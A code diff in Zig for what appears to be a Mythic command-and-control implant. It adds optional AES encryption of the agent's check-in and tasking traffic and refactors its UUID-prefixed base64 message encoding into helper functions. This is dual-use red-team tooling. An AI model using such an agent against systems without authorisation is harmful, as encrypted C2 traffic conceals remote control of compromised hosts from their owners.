@@ -37,7 +37,8 @@ pub const MythicAgent = struct {
     system_info: SystemInfo,
     crypto_utils: CryptoUtils,
 
-    aes_key: [32]u8, //For future use watch this space
+    encryption_enabled: bool,
+    aes_key: [32]u8, //The future is here
     payload_uuid: []const u8,
 
     tasks: std.ArrayList(MythicTask),
@@ -49,7 +50,17 @@ pub const MythicAgent = struct {
         var crypto_utils = CryptoUtils.init(allocator);
 
         const session_id = try crypto_utils.generateSessionId(io); //session_id might be useful later. Not implemented yet
-        const aes_key = CryptoUtils.generateAESKey(io);
+        const encryption_enabled = config.encryption_enabled;
+        var aes_key: [32]u8 = undefined;
+
+        if (encryption_enabled) {
+            const decoder = std.base64.standard.Decoder;
+            const expected_len = try decoder.calcSizeForSlice(config.aes_key_b64);
+            if (expected_len != 32) return error.InvalidAESKeyLength;
+            try decoder.decode(&aes_key, config.aes_key_b64);
+        } else {
+            aes_key = [_]u8{0} ** 32;
+        }
 
         return Self{
             .allocator = allocator,
@@ -62,7 +73,8 @@ pub const MythicAgent = struct {
             .system_info = SystemInfo.init(allocator, io, environ_map),
             .crypto_utils = crypto_utils,
             .aes_key = aes_key,
-            .payload_uuid = config.payload_uuid,
+            .encryption_enabled = config.encryption_enabled,
+            .payload_uuid = try allocator.dupe(u8, config.payload_uuid),
             .tasks = std.ArrayList(MythicTask).empty,
             .pending_responses = std.ArrayList(MythicResponse).empty,
             .is_running = false,
@@ -76,6 +88,74 @@ pub const MythicAgent = struct {
         self.pending_responses.deinit(self.allocator);
         self.network_client.deinit();
         self.allocator.free(self.payload_uuid);
+    }
+
+    fn encodeMessage(self: *Self, json_bytes: []const u8) ![]u8 {
+        var payload: []const u8 = undefined;
+        var owned_blob: ?[]u8 = null;
+        defer if (owned_blob) |b| self.allocator.free(b);
+
+        if (self.encryption_enabled) {
+            const blob = try self.crypto_utils.mythicEncrypt(&self.aes_key, json_bytes, self.io);
+            owned_blob = blob;
+            payload = blob;
+        } else {
+            payload = json_bytes;
+        }
+
+        const combined_len = self.payload_uuid.len + payload.len;
+        const combined = try self.allocator.alloc(u8, combined_len);
+        defer self.allocator.free(combined);
+        @memcpy(combined[0..self.payload_uuid.len], self.payload_uuid);
+        @memcpy(combined[self.payload_uuid.len..], payload);
+
+        const encoder = base64.standard.Encoder;
+        const b64_len = encoder.calcSize(combined.len);
+        const b64_data = try self.allocator.alloc(u8, b64_len);
+        _ = encoder.encode(b64_data, combined);
+        return b64_data;
+    }
+    /// Decode a Mythic wire message → plaintext JSON bytes
+    fn decodeMessage(self: *Self, b64_response: []const u8) ![]u8 {
+        const decoded_len =
+            base64.standard.Decoder.calcSizeForSlice(b64_response) catch
+                return error.InvalidBase64;
+
+        const decoded = try self.allocator.alloc(u8, decoded_len);
+        defer self.allocator.free(decoded);
+
+        try base64.standard.Decoder.decode(decoded, b64_response);
+
+        if (decoded.len < 36)
+            return error.InvalidResponse;
+
+        const body = decoded[36..];
+
+        var plaintext: []u8 = undefined;
+
+        if (self.encryption_enabled) {
+            plaintext = try self.crypto_utils.mythicDecrypt(
+                &self.aes_key,
+                body,
+            );
+        } else {
+            plaintext = try self.allocator.dupe(u8, body);
+        }
+        defer self.allocator.free(plaintext);
+
+        const inner_len =
+            base64.standard.Decoder.calcSizeForSlice(plaintext) catch
+                return error.InvalidBase64;
+
+        const inner = try self.allocator.alloc(u8, inner_len);
+        defer self.allocator.free(inner);
+
+        try base64.standard.Decoder.decode(inner, plaintext);
+
+        if (inner.len < 36)
+            return error.InvalidResponse;
+
+        return try self.allocator.dupe(u8, inner[36..]);
     }
 
     pub fn run(self: *Self) !void {
@@ -193,46 +273,28 @@ pub const MythicAgent = struct {
         const json_bytes = try json_writer.toOwnedSlice();
         defer self.allocator.free(json_bytes);
 
-        var combined = std.ArrayList(u8).empty;
-        defer combined.deinit(self.allocator);
-        try combined.appendSlice(self.allocator, self.payload_uuid);
-        try combined.appendSlice(self.allocator, json_bytes);
-
-        const encoder = base64.standard.Encoder;
-        const b64_len = encoder.calcSize(combined.items.len);
-        const b64_data = try self.allocator.alloc(u8, b64_len);
+        const b64_data = try self.encodeMessage(json_bytes);
         defer self.allocator.free(b64_data);
-        _ = encoder.encode(b64_data, combined.items);
 
         const response = try self.network_client.sendRequest("data", b64_data);
         defer self.allocator.free(response);
 
-        const decoded_len = base64.standard.Decoder.calcSizeForSlice(response) catch {
-            print("", .{});
-            return error.InvalidBase64;
-        };
-        const decoded_response = try self.allocator.alloc(u8, decoded_len);
-        defer self.allocator.free(decoded_response);
-        base64.standard.Decoder.decode(decoded_response, response) catch {
-            print("", .{});
-            return error.InvalidBase64;
-        };
+        const json_response = try self.decodeMessage(response);
+        defer self.allocator.free(json_response);
 
-        if (response.len < 36) {
-            return error.InvalidResponse;
-        }
-        const json_response = decoded_response[36..];
         const parsed = json.parseFromSlice(json.Value, self.allocator, json_response, .{}) catch |err| {
             print("{}", .{err});
             return err;
         };
         defer parsed.deinit();
-        if (parsed.value.object.get("id")) |payload_uuid_value| {
-            self.payload_uuid = try self.allocator.dupe(u8, payload_uuid_value.string);
+
+        if (parsed.value.object.get("id")) |id_value| {
+            // NOTE: To self; Could be a point of memory headaches here
+            self.allocator.free(self.payload_uuid);
+            self.payload_uuid = try self.allocator.dupe(u8, id_value.string);
         } else {
             return error.InvalidResponse;
         }
-
         self.last_checkin = TimeUtils.getCurrentTimestamp(self.io);
     }
 
@@ -250,51 +312,23 @@ pub const MythicAgent = struct {
         const json_bytes = try json_writer.toOwnedSlice();
         defer self.allocator.free(json_bytes);
 
-        var combined = std.ArrayList(u8).empty;
-        defer combined.deinit(self.allocator);
-
-        try combined.appendSlice(self.allocator, self.payload_uuid);
-        try combined.appendSlice(self.allocator, json_bytes);
-
-        const encoder = base64.standard.Encoder;
-        const b64_len = encoder.calcSize(combined.items.len);
-        const b64_data = try self.allocator.alloc(u8, b64_len);
+        const b64_data = try self.encodeMessage(json_bytes);
         defer self.allocator.free(b64_data);
-        _ = encoder.encode(b64_data, combined.items);
 
         const response = try self.network_client.sendRequest("data", b64_data);
         defer self.allocator.free(response);
 
-        const decoded_len = base64.standard.Decoder.calcSizeForSlice(response) catch {
-            print("", .{});
-            return error.InvalidBase64;
-        };
-        const decoded_response = try self.allocator.alloc(u8, decoded_len);
-        defer self.allocator.free(decoded_response);
+        const json_response = try self.decodeMessage(response);
+        defer self.allocator.free(json_response);
 
-        base64.standard.Decoder.decode(decoded_response, response) catch {
-            print("", .{});
-            return error.InvalidBase64;
-        };
-
-        if (response.len < 36) {
-            return error.InvalidResponse;
-        }
-        const Task = struct {
-            id: []const u8,
-            command: []const u8,
-            timestamp: i64,
-            parameters: json.Value,
-        };
-        const json_response = decoded_response[36..];
-
-        const parsed = json.parseFromSlice(struct { action: []const u8, tasks: []Task }, self.allocator, json_response, .{}) catch |err| {
+        const parsed = json.parseFromSlice(json.Value, self.allocator, json_response, .{}) catch |err| {
             print("{}", .{err});
             return err;
         };
         defer parsed.deinit();
 
         try self.parseTaskResponse(json_response);
+        self.last_checkin = TimeUtils.getCurrentTimestamp(self.io);
     }
 
     fn parseTaskResponse(self: *Self, response: []const u8) !void {
@@ -391,17 +425,8 @@ pub const MythicAgent = struct {
         const json_bytes = try json_writer.toOwnedSlice();
         defer self.allocator.free(json_bytes);
 
-        var combined = std.ArrayList(u8).empty;
-        defer combined.deinit(self.allocator);
-
-        try combined.appendSlice(self.allocator, self.payload_uuid);
-        try combined.appendSlice(self.allocator, json_bytes);
-
-        const encoder = base64.standard.Encoder;
-        const b64_len = encoder.calcSize(combined.items.len);
-        const b64_data = try self.allocator.alloc(u8, b64_len);
+        const b64_data = try self.encodeMessage(json_bytes);
         defer self.allocator.free(b64_data);
-        _ = encoder.encode(b64_data, combined.items);
 
         const server_response = try self.network_client.sendRequest("data", b64_data);
         defer self.allocator.free(server_response);
@@ -409,7 +434,6 @@ pub const MythicAgent = struct {
         for (self.pending_responses.items) |*response| {
             response.deinit(self.allocator);
         }
-
         self.pending_responses.clearRetainingCapacity();
     }
 
